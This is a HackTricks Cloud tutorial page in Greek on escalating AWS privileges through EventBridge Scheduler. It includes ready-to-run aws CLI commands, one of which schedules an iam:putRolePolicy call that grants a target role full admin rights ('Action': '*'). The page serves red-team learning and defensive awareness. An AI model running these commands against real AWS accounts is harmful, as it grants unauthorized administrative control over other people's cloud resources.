# AWS - EventBridge Scheduler Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## EventBridge Scheduler

Ο EventBridge Scheduler μπορεί να χρησιμοποιηθεί για την κλιμάκωση δικαιωμάτων μέσω προγραμματισμένων κλήσεων σε διάφορες υπηρεσίες AWS. Εκμεταλλευόμενοι την ικανότητά του να καλεί υπηρεσίες σε προγραμματισμένη βάση, οι χρήστες με επαρκή δικαιώματα μπορούν να κλιμακώσουν τα προνόμιά τους. Ακολουθούν μερικές από τις βασικές ενέργειες που μπορεί να ενεργοποιήσει ο EventBridge Scheduler χρησιμοποιώντας προτυπωμένους στόχους:

- Lambda: lambda:InvokeFunction - Κλήση λειτουργιών Lambda σε προγραμματισμένο χρόνο.
- CodeBuild: codebuild:StartBuild - Έναρξη έργων AWS CodeBuild.
- CodePipeline: codepipeline:StartPipelineExecution - Ενεργοποίηση εκτελέσεων AWS CodePipeline.
- ECS: ecs:RunTask - Εκτέλεση εργασιών ECS.
- EventBridge: events:PutEvents - Τοποθέτηση γεγονότων στο EventBridge.
- Inspector: inspector:StartAssessmentRun - Έναρξη αξιολογήσεων Amazon Inspector.
- Kinesis: kinesis:PutRecord - Τοποθέτηση εγγραφών σε ροές Kinesis.
- Firehose: firehose:PutRecord - Τοποθέτηση εγγραφών σε ροές παράδοσης Firehose.
- SageMaker: sagemaker:StartPipelineExecution - Έναρξη εκτελέσεων SageMaker pipeline.
- SNS: sns:Publish - Δημοσίευση μηνυμάτων σε θέματα SNS.
- SQS: sqs:SendMessage - Αποστολή μηνυμάτων σε ουρές SQS.
- Step Functions: states:StartExecution - Έναρξη εκτελέσεων AWS Step Functions.

Αυτές είναι μόνο μερικές από τις προτυπωμένες ενέργειες που μπορεί να εκτελέσει ο EventBridge Scheduler. Ωστόσο, χρησιμοποιώντας καθολικούς στόχους, μπορούν να ενεργοποιηθούν πολλές άλλες ενέργειες σε υπηρεσίες AWS. Οι καθολικοί στόχοι επιτρέπουν πιο εκτενείς λειτουργίες API πέρα από τη λίστα με τα πρότυπα.

Περισσότερες πληροφορίες για τον EventBridge Scheduler στο:

{% content-ref url="../aws-services/eventbridgescheduler-enum.md" %}
[eventbridgescheduler-enum.md](../aws-services/eventbridgescheduler-enum.md)
{% endcontent-ref %}

### `sts:AssumeRole`, `iam:PassRole`, (`scheduler:CreateSchedule` | `scheduler:UpdateSchedule`)

Οι χρήστες με δικαιώματα `sts:AssumeRole`, `iam:PassRole`, και `scheduler:CreateSchedule or scheduler:UpdateSchedule` μπορούν να κλιμακώσουν τα προνόμιά τους εκμεταλλευόμενοι τον EventBridge Scheduler για να καλέσουν υπηρεσίες χρησιμοποιώντας έναν ρόλο με υψηλότερα προνόμια.

Με αυτά τα δικαιώματα, ένας επιτιθέμενος μπορεί να αναλάβει έναν ρόλο με ανυψωμένα προνόμια και να περάσει αυτόν τον ρόλο στον EventBridge Scheduler κατά τη δημιουργία ή την ενημέρωση ενός προγράμματος. Το πρόγραμμα μπορεί να ρυθμιστεί για να εκτελεί οποιαδήποτε από τις ενέργειες που αναφέρονται προηγουμένως, όπως η κλήση λειτουργιών Lambda, η έναρξη εργασιών ECS, η ενεργοποίηση εκτελέσεων CodePipeline ή οποιαδήποτε λειτουργία από τις 270 υπηρεσίες AWS που υποστηρίζονται από τον EventBridge Scheduler. Προγραμματίζοντας αυτές τις ενέργειες, ένας επιτιθέμενος θα μπορούσε να καταχραστεί υψηλότερα προνόμια για να εκτελέσει μη εξουσιοδοτημένες λειτουργίες σε υπηρεσίες AWS.
\\

Για παράδειγμα, θα μπορούσαν να ρυθμίσουν το πρόγραμμα να καλεί μια λειτουργία Lambda, η οποία είναι μια προτυπωμένη ενέργεια:
```bash
aws scheduler create-schedule \
--name MyLambdaSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:lambda:<region>:<account-id>:function:<LambdaFunctionName>",
"RoleArn": "arn:aws:iam::<account-id>:role/<RoleName>"
}'
```
Εκτός από τις προτυπωμένες ενέργειες υπηρεσιών, μπορείτε να χρησιμοποιήσετε καθολικούς στόχους στο EventBridge Scheduler για να καλέσετε μια ευρεία γκάμα API λειτουργιών για πολλές υπηρεσίες AWS. Οι καθολικοί στόχοι προσφέρουν ευελιξία για να καλέσετε σχεδόν οποιοδήποτε API. Ένα παράδειγμα μπορεί να είναι η χρήση καθολικών στόχων προσθέτοντας "AdminAccessPolicy", χρησιμοποιώντας έναν ρόλο που έχει πολιτική "putRolePolicy":
```bash
aws scheduler create-schedule \
--name GrantAdminToTargetRoleSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:scheduler:::aws-sdk:iam:putRolePolicy",
"RoleArn": "arn:aws:iam::<account-id>:role/RoleWithPutPolicy",
"Input": "{\"RoleName\": \"TargetRole\", \"PolicyName\": \"AdminAccessPolicy\", \"PolicyDocument\": \"{\\\"Version\\\": \\\"2012-10-17\\\", \\\"Statement\\\": [{\\\"Effect\\\": \\\"Allow\\\", \\\"Action\\\": \\\"*\\\", \\\"Resource\\\": \\\"*\\\"}]}\"}"
}'
```
## Αναφορές

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html)

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
